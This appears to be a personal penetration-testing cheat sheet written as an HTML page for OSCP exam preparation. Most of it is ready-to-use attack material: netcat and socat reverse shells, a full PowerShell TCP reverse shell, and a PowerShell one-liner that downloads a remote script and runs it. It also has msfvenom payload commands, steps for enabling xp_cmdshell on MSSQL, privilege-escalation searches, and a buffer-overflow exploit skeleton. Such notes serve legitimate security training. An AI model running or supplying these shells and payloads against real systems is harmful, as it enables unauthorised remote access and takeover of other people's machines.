<h1>General Reference list (Incomplete)</h1>
<h4>I will add to this more as have more time</h4>

<h3>#search for public exploits</h3> 

<p>Searchsploit<br>
exploitdb<br>
Google<br>
github</p>

<h3>#Serve content</h3>
 
<p>python3 -m http.server 80 <br>
 python2 -m SimpleHTTPServer 80</p>
 
<h3>#Linux download commands</h3> 
<p>wget <br>
curl<br>
w3m<br>
elinks</p>

<h3>#windows download commands</h3>
<p>certutil.exe -urlcache -f http://serverip/port outputfile</p>

<h3>#spawn tty shells</h3>

<p>python -c 'import pty; pty.spawn("/bin/sh")' <br>
python -c 'import pty; pty.spawn("/bin/bash")' <br>
echo os.system('/bin/bash') <br>
/bin/sh -i <br>
perl —e 'exec "/bin/sh";' <br>
perl: exec "/bin/sh"; <br>
ruby: exec "/bin/sh"<br>
lua: os.execute('/bin/sh')<br>
exec "/bin/sh"<br>
in vi editor - :!bash<br> 
in vi editor - :set shell=/bin/bash:shell<br>
in nmap - !sh<br>
socat file:`tty`,raw,echo=0 tcp-listen:666<br>
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:xxx.xxx.xxx.xxx:666<br>
nc -lnvp 666 #listener netcat needs to be upgraded with above shells. <br>
nc ip port –e /bin/bash #reverse shell overused </p>

<h3>#Linux permission search</h3>
<p>find /usr/bin/ -perm -u=s # set uids <br>

find / -writable -type d 2>/dev/null # world-writeable folders<br>
find / -perm -777 -type d 2>/dev/null # world-writeable folders<br>

find / -perm -o w -type d 2>/dev/null # world-writeable folders<br>

find / -perm -o x -type d 2>/dev/null # world-executable folders<br>

find / \( -perm -o w -perm -o x \) -type d 2>/dev/null # world-writeable & executable folder</p>


<h3>#communicate with msssql</h3>

<p>#basic mysql stuff to login and database <br>
mysql -u username -p password; <br>
show databases; <br>
use table; <br>
show tables; <br>
select * from table; <br>

sqsh<br>

xpcmdshell #is what you want to use in mssql with sqsh to get a command shell. If you dont have permission and its misconfigured, this is how you get a shell in sql. <br>
1> xp_cmdshell 'whoami';<br>
2> go<br>
Msg 15281, Level 16, State 1 error so we enable since we are sa account<br>

1> EXEC sp_configure 'show advanced options', 1;<br>
2> go<br>
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE<br>
statement to install.<br>
(return status = 0)<br>
1> RECONFIGURE; <br>
2> go<br>
1> EXEC sp_configure 'xp_cmdshell', 1;<br>
2> go<br>
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to
install.<br>
(return status = 0)<br>
1> RECONFIGURE;<br>
2> go<br>

1> xp_cmdshell 'whoami';<br>
2> go<br>
</p>

<h3>#windows powershell Reverse shell and powershell command to download and run as soon as its done downloading the file and to run the function in it.</h3>

<p>powershell.exe','-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"iptoconnectto\",port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"' <br>
powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://server:port/powershellfile.ps1'));Invoke-functiontocallfromyourps1"</p>



<h3>###########MSF venom###########</h3>
<p>#Format<br>
msfvenom -p <payload> -f <ext> LHOST=<ip> LPORT=<port><br>

#Always check payload type!!<br>
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe -o shell.exe<br>

#ALWAYS USE STAGELESS PAYLOADS FOR NC REVERSE SHELL<br>

if !(shell_return){ #if no shell returns arch problem else if shell died payload problem<br>
	arch problem;<br>
elseif (shell_died_instantly)){<br>
	payload problem;<br>
	}	<br>
}<br>

#Staged payload = split into 2 areas, 1st to initiate connection, rest to send actual payload ==> reverse_tcp<br>
#Stageless payload = all in one, suitable for nc listeners bcx it is stable ==> shell_reverse_tcp<br>

msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=80 -f exe -o shell.exe </p>



<h3>#######################Buffer Overflow section##################</h3>
<p>When you have a server or program that is on your network, and it is vulnerable to buffer overflow bad things happen. <br>

https://steflan-security.com/complete-guide-to-stack-buffer-overflow-oscp/ <br>

#!/usr/bin/python<br>
import socket<br>
import time<br>
import sys<br>
badchars = ("")<br>
filler = "Z" * xxx<br>
eip =  "\x00\x00\x00\x00" <br>
offset = "x" * xxx<br>
end = "\r\n" #return or enter if needed <br>
nops = "\x90" * 10 <br>
<br>
try:<br>
    print "\nThis is my boom stick!"<br>
<br>
    inputbuffer = filler<br>
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)<br>
    s.connect(("192.168.0.0", 666))<br>
    s.send(inputbuffer)<br>
    s.close()<br>
    print "derka derka" <br>
<br>
except:<br>
    print "\nSomething Went wrong"<br>
    sys.exit()<br>
<br>
<br>
find open port and ip <br>
send string until eip is overflown <br>
send pattern from msf-pattern_create <br>
send pattern from msf and check offset <br>
gain control of eip and look for jump in assembly instructions from monamodules (make sure protections arent on in the thingy you find) <br>
find the address for jump and stick in eip <br>
generate shell code and launch <br>

msf-pattern_create -l <br>
msf-pattern_offset -l -q <br>
!mona modules <br>
!mona find -s "\x00\x00" -m module </p>

<h3>#######################Links and other section####################</h3>

<p>Tools <br>
https://github.com/codingo/Reconnoitre<br>
<br>
Upgrading shells<br>
https://netsec.ws/?p=337<br>
<br>
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/<br>
<br>
https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/<br>
<br>
JSON token <br>
https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4 <br>
<br>
https://recipeforroot.com/ <br>


Window privesc:- <br>
http://www.fuzzysecurity.com/tutorials/16.html <br>
https://github.com/abatchy17/WindowsExploits <br>
https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html <br>

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc     <<warning may have automated exploitation in it. <br>
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/ <br>
https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html <br>
<br>

IMPORTANT**** <br>
snapd <br>
https://github.com/initstring/dirty_sock<br>
<br>
Breaking restrected shells<br>
https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells </p>
<br>
	<br>

<h3>#####Tools you can use If your doing oscp######</h3>
<p>SUID3NUM <br>
winpeas <br>
linpeas <!= 2.7.0 <br>
lse.sh (google it) <br>
nmapautomator #If you want automation because it only scans one host i made a suppliment script (https://github.com/pyro0ownz/nmapAutomator) <br>
AutoRecon </p>


<p><b>More to come when i can gather my thoughts and play with some more stuff. Wish you luck and hope this helps!</b></p>

 
